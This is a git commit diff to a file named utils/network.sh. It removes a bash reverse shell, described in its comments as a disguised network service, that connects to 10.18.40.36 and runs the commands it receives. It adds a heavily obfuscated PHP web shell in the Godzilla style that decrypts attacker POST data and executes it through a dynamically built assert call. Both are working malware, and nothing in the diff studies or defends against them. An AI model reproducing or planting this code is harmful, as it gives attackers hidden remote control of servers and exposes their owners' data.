0c459f046f683245981ee6e9d7e805f34d6b4c36
likeyou <102893013+liKeyou567@users.noreply.github.com>
2026-05-14 14:34:37 +0800

    Update network.sh

--- moke1120260521/utils/network.sh
+++ moke1120260521/utils/network.sh
@@ -1,22 +1,37 @@
-#!/bin/bash
-# 系统网络服务（伪装）
-IP="10.18.40.36"
-PORT="80"
-
-# 哥斯拉兼容反向Shell，带断线重连
-echo "→ 初始化网络连接服务..."
-sleep 2
-
-while :; do
-    # 建立TCP连接
-    exec 5<>/dev/tcp/$IP/$PORT
-    if [ $? -eq 0 ]; then
-        echo "→ 连接建立成功"
-        # 双向数据交互
-        cat <&5 | while read line; do
-            $line 2>&5 >&5
-        done
-    fi
-    # 连接断开后等待2秒重连
-    sleep 2
-done
+<?pHP
+@session_start();
+@set_time_limit(Chr("48"));
+@error_reporting/*fuckgovD6k*/(Chr("48"));
+function baidun9mfcQjD9BbejBf(/*fuckgov9*/$baiducYN6Lck,$baidux){
+    for($baiduFZeCU=Chr("48");$baiduFZeCU<strlen($baiducYN6Lck);$baiduFZeCU++) {
+        $baiduCi8wmUZFI = $baidux[$baiduFZeCU+Chr("49")&15];
+        $baiducYN6Lck[$baiduFZeCU] = $baiducYN6Lck[$baiduFZeCU]^$baiduCi8wmUZFI;
+    }
+    return $baiducYN6Lck;
+}
+$baidubTZxNorHM = "bas"."e6".Chr("52")."_"."de"."cod".Chr("101");
+$base64_baidun9mfcQjD9BbejBf = "bas"."e6".Chr("52")."_e".Chr("110").Chr("99")."ode";
+$baiduqboshrMAsFIp=("&"^"r").("7"^"V").("I"^":").("p"^"I").("_"^":").$baidubTZxNorHM($baidubTZxNorHM("Y2c9PQ=="));
+$baiduveUQjiG7lvwbf='p'.$baidubTZxNorHM($baidubTZxNorHM("WVhsc2IyRms="));
+$baidujDARhCjX='59d14459'.$baidubTZxNorHM("NzAyNDIxMzY=");
+$baidueiTII=("!"^"@").'ss'.Chr("101").'rs';
+$baidueiTII++;
+if (isset($_POST/*fuckgovHPgAqZ3m0n9s*/[$baiduqboshrMAsFIp])){
+    $datbaidueiTII=baidun9mfcQjD9BbejBf/*fuckgovvl6vA7Gjh*/($baidubTZxNorHM($_POST[$baiduqboshrMAsFIp]),$baidujDARhCjX);
+    if (/*fuckgovPNvAl8Q6vwcoZRQ*/isset($_SESSION/*fuckgovPv8oOVG*/[$baiduveUQjiG7lvwbf])){
+        $baidu3=baidun9mfcQjD9BbejBf($_SESSION/*fuckgov2cF3hju7URbEH*/[$baiduveUQjiG7lvwbf],$baidujDARhCjX);
+        if (/*fuckgovXkcOD0b*/strpos($baidu3,$baidubTZxNorHM/*fuckgovp28odhUvpdW37*/($baidubTZxNorHM("WjJWMFFtRnphV056U1c1bWJ3PT0=")))===false){
+            $baidu3=baidun9mfcQjD9BbejBf/*fuckgovg5RI9CdYbBaHff*/($baidu3,$baidujDARhCjX);
+        }
+		define("baiduqqN0qGIYJKe","//baidutod1EcM\r\n".$baidu3);
+		$baidueiTII(baiduqqN0qGIYJKe);
+        echo substr(/*fuckgovcUJXhSuTB*/md5/*fuckgovWeCOB68eUpkQVPK*/($baiduqboshrMAsFIp.$baidujDARhCjX),Chr("48"),16);
+        echo $base64_baidun9mfcQjD9BbejBf(baidun9mfcQjD9BbejBf(@run($datbaidueiTII),$baidujDARhCjX));
+        echo substr(/*fuckgovrb2jlj*/md5/*fuckgov60*/($baiduqboshrMAsFIp.$baidujDARhCjX),16);
+    }else{
+        if (strpos/*fuckgovg816QpzDUQR*/($datbaidueiTII,$baidubTZxNorHM($baidubTZxNorHM("WjJWMFFtRnphV056U1c1bWJ3PT0=")))!==false){
+            $_SESSION[$baiduveUQjiG7lvwbf]=baidun9mfcQjD9BbejBf($datbaidueiTII,$baidujDARhCjX);
+        }
+    }
+}
+?>
